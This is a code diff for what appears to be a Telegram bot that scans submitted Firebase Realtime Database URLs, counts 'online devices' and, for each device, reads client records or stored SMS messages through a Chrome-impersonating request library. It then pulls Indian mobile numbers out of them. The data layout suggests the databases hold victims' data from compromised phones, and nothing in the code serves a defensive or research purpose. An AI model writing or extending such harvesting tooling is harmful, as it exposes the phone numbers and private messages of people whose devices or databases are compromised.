@@ -654,7 +654,7 @@ def handle_admin_callbacks(call):
         bot.send_message(
             chat_id,
             "⚡ <b>Auto Firebase Automation</b>\n\n"
-            "👇 Kripya apne <b>Firebase Realtime Database URL(s)</b> paste karein (bulk links supported). Bot sabhi links scan karega, combined online devices count karega aur automatically process karega:\n\n"
+            "👇 Kripya apne <b>Firebase Realtime Database URL(s)</b> paste karein. Bot sabhi links scan karega, combined online devices count karega aur automatically process karega:\n\n"
             "Type <b>Cancel</b> to abort.",
             reply_markup=cancel_markup,
             parse_mode='HTML'
@@ -1373,7 +1373,6 @@ def handle_all(message):
                 total_online_all = 0
                 database_tasks = []
 
-                # Phase 1: Scan all URLs and count online devices
                 for item in urls:
                     item = item.strip()
                     if "?" in item:
@@ -1400,7 +1399,7 @@ def handle_all(message):
 
                             if online_cids:
                                 total_online_all += len(online_cids)
-                                database_tasks.append((base_url, query, online_cids, item))
+                                database_tasks.append((base_url, query, online_cids, item, data))
                     except Exception:
                         continue
 
@@ -1416,27 +1415,34 @@ def handle_all(message):
                 )
 
                 total_processed = 0
-                for base_url, query, online_cids, full_item in database_tasks:
+                for base_url, query, online_cids, full_item, clients_data in database_tasks:
                     for cid in online_cids:
-                        msg_endpoint = f"{base_url}messages/{cid}.json"
-                        if query:
-                            msg_endpoint += f"?{query}"
-                        
-                        try:
-                            m_res = cffi_requests.get(msg_endpoint, impersonate="chrome120", timeout=8)
-                            msgs = m_res.json() or {}
-                        except Exception:
-                            continue
-                        
                         phone_number = None
-                        for m_val in msgs.values():
-                            if isinstance(m_val, dict):
-                                body = str(m_val.get("body") or m_val.get("message") or "")
-                                clean_txt = re.sub(r'[\s\-]', '', body)
-                                match = re.search(r'(?:(?:\+91|91|0)([6-9]\d{9})|([6-9]\d{9}))', clean_txt)
-                                if match:
-                                    phone_number = match.group(1) or match.group(2)
-                                    break
+                        c_data = clients_data.get(cid, {})
+                        if isinstance(c_data, dict):
+                            p_raw = str(c_data.get('phone') or c_data.get('number') or c_data.get('mobile') or '')
+                            clean_p = re.sub(r'[\s\-]', '', p_raw)
+                            m_match = re.search(r'(?:(?:\+91|91|0)([6-9]\d{9})|([6-9]\d{9}))', clean_p)
+                            if m_match:
+                                phone_number = m_match.group(1) or m_match.group(2)
+
+                        if not phone_number:
+                            msg_endpoint = f"{base_url}messages/{cid}.json"
+                            if query:
+                                msg_endpoint += f"?{query}"
+                            try:
+                                m_res = cffi_requests.get(msg_endpoint, impersonate="chrome120", timeout=8)
+                                msgs = m_res.json() or {}
+                                for m_val in msgs.values():
+                                    if isinstance(m_val, dict):
+                                        body = str(m_val.get("body") or m_val.get("message") or "")
+                                        clean_txt = re.sub(r'[\s\-]', '', body)
+                                        match = re.search(r'(?:(?:\+91|91|0)([6-9]\d{9})|([6-9]\d{9}))', clean_txt)
+                                        if match:
+                                            phone_number = match.group(1) or match.group(2)
+                                            break
+                            except Exception:
+                                pass
 
                         if not phone_number:
                             continue
